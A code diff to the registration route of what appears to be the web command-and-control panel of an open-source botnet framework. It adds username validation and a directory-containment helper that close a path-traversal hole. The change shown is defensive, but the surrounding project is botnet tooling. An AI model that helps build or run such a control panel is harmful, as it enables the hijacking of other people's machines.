@@ -8,6 +8,7 @@ from flask import (
 from flask_login import login_user, logout_user, current_user, login_required
 from buildyourownbotnet import client, c2
 from buildyourownbotnet.core.dao import user_dao
+from buildyourownbotnet.core.path_safety import contained_user_dir, is_safe_username
 from buildyourownbotnet.users.forms import RegistrationForm, LoginForm, UpdateAccountForm, ResetPasswordForm
 from buildyourownbotnet.models import db, bcrypt, User, Session
 
@@ -26,6 +27,14 @@ def register():
 
 	form = RegistrationForm()
 	if form.validate_on_submit():
+		if not is_safe_username(form.username.data):
+			flash('Invalid username.', 'danger')
+			return redirect(url_for('users.register'))
+		try:
+			user_dir = contained_user_dir(OUTPUT_DIR, form.username.data)
+		except ValueError:
+			flash('Invalid username.', 'danger')
+			return redirect(url_for('users.register'))
 		# only allow 1 user on locally hosted version
 		if len(User.query.all()) == 0:
 			# add user to database
@@ -35,7 +44,6 @@ def register():
 			db.session.commit()
 
 			# create user directory
-			user_dir = os.path.join(OUTPUT_DIR, user.username)
 			if not os.path.exists(user_dir):
 				os.makedirs(user_dir)
 
